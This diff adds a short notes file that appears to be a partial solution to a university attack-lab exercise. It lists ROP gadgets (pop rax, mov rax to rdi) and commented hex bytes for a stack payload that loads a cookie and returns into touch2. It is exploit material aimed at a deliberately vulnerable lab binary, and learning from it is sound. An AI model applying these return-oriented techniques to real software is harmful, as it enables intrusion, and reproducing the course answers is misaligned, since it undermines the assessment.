@@ -1,0 +1,35 @@
+getval_142:
+  3: |
+    nop
+    nop
+    ret
+
+addval_273:
+  2: |
+    movq %rax, %rdi
+    ret
+  3: |
+    movl %eax, %edi
+    ret
+
+addval_219:
+  4: |
+    popq %rax
+    nop
+    ret
+
+# 00 00 00 00 00 40 17 ec     // return address: call touch2
+# 00 00 00 00 00 40 19 a2     // return address: call addval_273+2
+# 00 00 00 00 a8 dc 61 55     // cookie: popped into rax
+# 00 00 00 00 00 40 19 ab     // return address: call addval_219+4
+# ef be ad de ef be ad de     // rsp - 8
+# ef be ad de ef be ad de     // rsp - 16
+# ef be ad de ef be ad de     // rsp - 24
+# ef be ad de ef be ad de     // rsp - 32
+# ef be ad de ef be ad de     // rsp - 40
+
+setval_237:
+
+setval_424:
+
+
